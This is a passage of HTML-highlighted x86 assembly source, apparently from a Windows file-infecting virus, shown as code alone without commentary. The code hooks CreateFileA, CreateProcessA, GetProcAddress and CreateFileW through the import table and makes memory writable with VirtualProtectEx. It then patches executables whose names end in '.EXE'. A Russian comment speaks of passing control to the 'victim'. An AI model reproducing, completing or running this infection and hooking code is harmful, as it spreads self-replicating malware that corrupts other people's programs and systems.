                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">    </span><span class="sc1">; push XXXXXXh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">         </span><span class="sc1">; push CreateFileW+7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">; edi=CreateFileW</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRW</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndBegin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileW</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Ret2Prog</span><span class="sc0">

</span><span class="sc5">WINCS</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; esi=Import Table</span><span class="sc0">
                </span><span class="sc5">KERNEL32dllL2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc5">NameRVA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NameRVA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">LastEntry</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRCSum</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">zKERNEL32dll</span><span class="sc0">
                </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL2</span><span class="sc0">
</span><span class="sc5">LastEntry</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Ret2Prog</span><span class="sc0">
</span><span class="sc5">KERNEL32dllL1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                 </span><span class="sc5">AddressTableRVA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">AddressTableRVA</span><span class="sc4">]</span><span class="sc0">

                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Ael'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'iFet'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'aerC'</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'As'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'seco'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rPet'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'aerC'</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ss'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'erdd'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Acor'</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                 </span><span class="sc5">KERNEL32dllL4</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc1">; Crea teFi leA0,Crea tePr oces sA00,GetP rocA ddre ss00</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL3</span><span class="sc0">
                </span><span class="sc5">KERNEL32dllL3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;add eax,offset NewGetProcAddress - offset NewCreateFileA</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKernelHahdler</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">KERNEL32dllL4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL8</span><span class="sc0">
</span><span class="sc5">KERNEL32dllL8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">KERNEL32dllL7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">EndOfAddressTable</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL8</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRWdd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">KERNEL32dllL5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL6</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateProcess</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL8</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRWdd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;sub eax,offset NewCreateFileA - offset NewCreateProcess</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateProcess</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">KERNEL32dllL6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewGetProcAddress</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KERNEL32dllL8</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRWdd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">EndOfAddressTable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; Востановим стек</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Ret2Prog</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; ret old seh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">RET</span><span class="sc0">                       </span><span class="sc1">; Передача управления жертве</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SetRWdd</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetRW</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SetRW</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetCurrentProcess</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">VirtualProtectEx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InitKernel32dll</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Kern32VxInit</span><span class="sc0">
                 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">NewCreateProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
                  </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">NewCreateFileA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
                 </span><span class="sc6">pusha</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitKernel32dll</span><span class="sc0">

                 </span><span class="sc1">;mov edi,[esp+pushadd+8+4] ; smec4enie na imya</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">

                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Upcase</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">
                 </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">Ret2ProgExec</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Find1stSlash</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NameTestProc</span><span class="sc0">
                 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">Ret2ProgExec</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Patch_File_by_Name</span><span class="sc0">
                 </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">Ret2ProgExec</span><span class="sc0">

</span><span class="sc5">NewGetProcAddress</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
                   </span><span class="sc6">pusha</span><span class="sc0">
                  </span><span class="sc1">;mov ax,[esp+pushadd+8+2]</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

                  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">OrdinalValue</span><span class="sc0">

                  </span><span class="sc1">;mov esi,[esp+pushadd+8]</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">

                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRCSum</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">zCreateFileA</span><span class="sc0">
                  </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">TestCreateProcess</span><span class="sc0">

                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurEIP</span><span class="sc0">
</span><span class="sc5">NewGetProcAddressL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewGetProcAddressL1</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateFileA</span><span class="sc0">
                     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                     </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">endofGetProc</span><span class="sc0">

</span><span class="sc5">TestCreateProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">zCreateProcessA</span><span class="sc0">
                   </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">OrdinalValue</span><span class="sc0">

                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurEIP</span><span class="sc0">
</span><span class="sc5">NewGetProcAddressL2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewGetProcAddressL2</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewCreateProcess</span><span class="sc0">
                     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">endofGetProc</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">popa</span><span class="sc0">
                     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Ret2ProgExec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">OrdinalValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">NewCreateFileW</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NewCreateFileWL1</span><span class="sc0">
</span><span class="sc5">@3AHyaTO</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
